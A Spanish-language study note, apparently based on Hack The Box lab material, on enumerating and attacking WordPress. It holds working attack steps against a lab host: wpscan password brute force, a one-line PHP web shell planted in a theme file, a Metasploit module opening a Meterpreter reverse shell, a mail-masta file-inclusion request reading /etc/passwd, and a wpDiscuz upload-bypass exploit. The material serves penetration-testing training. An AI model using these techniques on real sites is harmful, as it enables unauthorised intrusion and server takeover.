---
tags:
  - Enumeración
  - CMS
---

## Enumeración

Una forma rápida de identificar un sitio de WordPress es navegando al `/robots.txt` archivo. Un robots.txt típico en una instalación de WordPress puede verse como:

```shell-session
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```

### Direcciones

- **wp-login.php**
	- Portal de inicio de sesión
- **wp-content/plugins**
	- Almacenamiento de plugins
- **wp-content/themes**
	- Almacenamiento de themes


### Tipos de usuarios estandar

1. **Administrador**: Este usuario tiene acceso a funciones administrativas dentro del sitio web. Esto incluye agregar y eliminar usuarios y publicaciones, así como editar código fuente.
2. **Editor**: Un editor puede publicar y administrar publicaciones, incluidas las publicaciones de otros usuarios.
3. **Autor**: Pueden publicar y administrar sus propias publicaciones.
4. **Colaborador**: Estos usuarios pueden escribir y administrar sus propias publicaciones pero no pueden publicarlas.
5. **Suscriptor**: Estos son usuarios estándar que pueden navegar por las publicaciones y editar sus perfiles.


### Enumeración Curl

#### Plugins

```shell-session
vcrdcr@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep plugins

<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' id='subscriber-js-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.8' id='validation-engine-en-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8' id='validation-engine-js'></script>
		<link rel='stylesheet' id='mm_frontend-css'  href='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2' id='contact-form-7-js'></script>
```

Navegando a `http://blog.inlanefreight.local/wp-content/plugins/mail-masta/` nos muestra que la lista de directorios está habilitada y que a `readme.txt` el archivo está presente. Estos archivos son muy a menudo útiles en la toma de huellas digitales de los números de versión. De la readme, parece que la versión 1.0.0 del plugin está instalado, que sufre de un [Inclusión Local de Archivos](https://www.exploit-db.com/exploits/50226) vulnerabilidad que se publicó en agosto de 2021.

Vamos a cavar un poco más. Comprobando la fuente de la página de otra página, podemos ver que el [wpDiscuz](https://wpdiscuz.com/) plugin está instalado, y parece ser la versión 7.0.4

```shell-session
vcrdcr@htb[/htb]$ curl -s http://blog.inlanefreight.local/?p=1 | grep plugins

<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpdiscuz-frontend-css-css'  href='http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4' type='text/css' media='all' />
```


### Enumeración de Usuarios
También podemos hacer una enumeración manual de los usuarios. Como se mencionó anteriormente, la página de inicio de sesión predeterminada de WordPress se puede encontrar en `/wp-login.php`.
Un nombre de usuario válido y una contraseña no válida dan como resultado el siguiente mensaje:
![Página de inicio de sesión de WordPress con mensaje de error: 'La contraseña para el administrador del nombre de usuario es incorrecta.'](https://academy.hackthebox.com/storage/modules/113/valid_user.png)

Sin embargo, un nombre de usuario no válido devuelve que no se encontró al usuario.
![Página de inicio de sesión de WordPress con mensaje de error: 'El nombre de usuario que alguien no está registrado en este sitio.'](https://academy.hackthebox.com/storage/modules/113/invalid_user.png)


### WPScan
[[wpscan]] es un escáner automatizado de WordPress y una herramienta de enumeración. Determina si los diversos temas y complementos utilizados por un blog están desactualizados o son vulnerables. Se instala de forma predeterminada en Parrot OS, pero también se puede instalar manualmente con `gem`.

```shell-session
vcrdcr@htb[/htb]$ sudo gem install wpscan
```

WPScan también puede extraer información de vulnerabilidad de fuentes externas. Podemos obtener un token API de [WPVulnDB](https://wpvulndb.com/), que es utilizado por WPScan para escanear PoC e informes. El plan gratuito permite hasta 75 solicitudes por día. Para usar la base de datos WPVulnDB, simplemente cree una cuenta y copie el token API de la página de usuarios. Este token se puede suministrar a wpscan utilizando el `--api-token parameter`.

El `--enumerate` flag se utiliza para enumerar varios componentes de la aplicación WordPress, como complementos, temas y usuarios. De forma predeterminada, WPScan enumera complementos, temas, usuarios, medios y copias de seguridad vulnerables.

 Invocaremos un escaneo de enumeración normal contra un sitio web de WordPress con el `--enumerate` marcar y pasar un token API de WPVulnDB con el `--api-token` bandera.

```shell
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
```

El número predeterminado de hilos utilizados es `5`. Sin embargo, este valor se puede cambiar usando el `-t` bandera.



## Ataque
### Fuerza Bruta
WPScan se puede utilizar para forzar nombres de usuario y contraseñas

En la enumeración del comando te salen usuarios

```shell
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
```

**Tipos de inicio de sesión**
- xmlrpc
	- Mediante API
- wp-login
	- Mediante la página

```shell
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

### Ejecución de código (Con acceso a admin)
Podemos modificar el código fuente de PHP para ejecutar comandos del sistema.

clic en `Appearance` en el panel lateral y seleccione Editor de temas. Esta página nos permitirá editar el código fuente de PHP directamente. Se puede seleccionar un tema inactivo para evitar corromper el tema principal. Ya sabemos que el tema activo es la Gravedad del Transporte. En su lugar, se puede elegir un tema alternativo como Twenty Nineteen.

Haga clic en `Select` después de seleccionar el tema, y podemos editar una página poco común como `404.php` para agregar un shell web.

```php
system($_GET[0]);
```

El código anterior debería permitirnos ejecutar comandos a través del parámetro GET `0`. Añadimos esta única línea al archivo justo debajo de los comentarios para evitar demasiada modificación de los contenidos.

![Editor de temas de WordPress que muestra 404.php con una vulnerabilidad de comando del sistema en el tema Twenty Nineteen.](https://academy.hackthebox.com/storage/modules/113/theme_editor.png)

Update File

Sabemos que los temas de WordPress se encuentran en `/wp-content/themes/<theme name>`. Podemos interactuar con el shell web a través del navegador o utilizando `cURL`. Como siempre, podemos utilizar este acceso para obtener un shell inverso interactivo y comenzar a explorar el objetivo.

```shell
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


#### Con MetaSploit

El [wp_admin_shell_subir](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) el módulo de Metasploit se puede usar para cargar un shell y ejecutarlo automáticamente.

El módulo carga un complemento malicioso y luego lo usa para ejecutar un shell PHP Meterpreter. Primero necesitamos establecer las opciones necesarias.

```shell-session
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```

Entonces podemos emitir el `show options` comando para asegurarse de que todo está configurado correctamente. En este ejemplo de laboratorio, debemos especificar tanto el vhost como la dirección IP, o el exploit fallará con el error `Exploit aborted due to failure: not-found: The target does not appear to be using WordPress`.

```shell
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options 

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting           Required  Description
   ----       ---------------           --------  -----------
   PASSWORD   firebird1                 yes       The WordPress password to authenticate with
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.42.195             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                        yes       The target port (TCP)
   SSL        false                     no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                         yes       The base path to the wordpress application
   USERNAME   john                      yes       The WordPress username to authenticate with
   VHOST      blog.inlanefreight.local  no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress
```

Una vez que estemos satisfechos con la configuración, podemos escribir `exploit` y obtener una shell inversa. A partir de aquí, podríamos comenzar a enumerar el host para datos confidenciales o rutas para la escalada de privilegios vertical/horizontal y el movimiento lateral.

```shell
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Authenticating with WordPress using doug:jessica1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/CczIptSXlr/wCoUuUPfIO.php...
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:42816) at 2021-09-20 19:43:46 -0400
i[+] Deleted wCoUuUPfIO.php
[+] Deleted CczIptSXlr.php
[+] Deleted ../CczIptSXlr

meterpreter > getuid

Server username: www-data (33)
```


### Aprovechamiento de Vulnerabilidades Conocidas

A lo largo de los años, el núcleo de WordPress ha sufrido su parte justa de vulnerabilidades, pero la gran mayoría de ellas se pueden encontrar en complementos. Según la página de Estadísticas de Vulnerabilidad de WordPress alojada [aquí](https://wpscan.com/statistics), en el momento de escribir este artículo, había 23,595 vulnerabilidades en la base de datos de WPScan. Estas vulnerabilidades se pueden desglosar de la siguiente manera:

- 4% núcleo de WordPress
- 89% plugins
- 7% temas

#### Plugins Vulnerables - mail-masta

Veamos algunos ejemplos. El plugin [mail-masta](https://wordpress.org/plugins/mail-masta/) ya no es compatible, pero ha tenido más de 2.300 [descargas](https://wordpress.org/plugins/mail-masta/advanced/) con los años. No está fuera del ámbito de la posibilidad de que podamos encontrarnos con este complemento durante una evaluación, probablemente instalado una vez y olvidado. Desde 2016 ha sufrido un [inyección SQL no autenticada](https://www.exploit-db.com/exploits/41438) y a [Inclusión Local de Archivos](https://www.exploit-db.com/exploits/50226).

Echemos un vistazo al código vulnerable para el plugin mail-masta.

```php
<?php 

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```

Como podemos ver, el `pl` parámetro nos permite incluir un archivo sin ningún tipo de validación de entrada o desinfección. Usando esto, podemos incluir archivos arbitrarios en el servidor web. Explotemos esto para recuperar el contenido de la `/etc/passwd` archivo usando `cURL`.

```shell
vcrdcr@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<SNIP>
```

#### Plugins Vulnerables - wpDiscuz

[wpDiscuz](https://wpdiscuz.com/) es un complemento de WordPress para comentarios mejorados en publicaciones de página. En el momento de escribir, el plugin había terminado [1,6 millones de descargas](https://wordpress.org/plugins/wpdiscuz/advanced/) y más de 90,000 instalaciones activas, lo que lo convierte en un complemento extremadamente popular que tenemos una muy buena oportunidad de encontrar durante una evaluación. Basado en el número de versión (7.0.4), esto [explotar](https://www.exploit-db.com/exploits/49967) tiene una buena oportunidad de conseguir la ejecución de comandos. El quid de la vulnerabilidad es un bypass de carga de archivos. wpDiscuz está destinado solo a permitir archivos adjuntos de imágenes. Las funciones de tipo mime de archivo podrían omitirse, lo que permite a un atacante no autenticado cargar un archivo PHP malicioso y obtener la ejecución remota de código. Se puede encontrar más información sobre el bypass de las funciones de detección de tipo mimo [aquí](https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/).

El script exploit toma dos parámetros: `-u` la URL y `-p` el camino a una publicación válida.

```shell
vcrdcr@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1

---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[102476] | code:[200]
[!] Got wmuSecurity value: 5c9398fcdb
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: uthsdkbywoxeebg

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot; 

> id

[x] Failed to execute PHP code...
```

El exploit como está escrito puede fallar, pero podemos usar `cURL` para ejecutar comandos utilizando el shell web cargado. Sólo necesitamos anexar `?cmd=` después del `.php` extensión para ejecutar comandos que podemos ver en el script exploit.

```shell
vcrdcr@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id

GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

En este ejemplo, nos gustaría asegurarnos de limpiar el `uthsdkbywoxeebg-1629904090.8191.php` archive y una vez más enumerarlo como un artefacto de prueba en los apéndices de nuestro informe.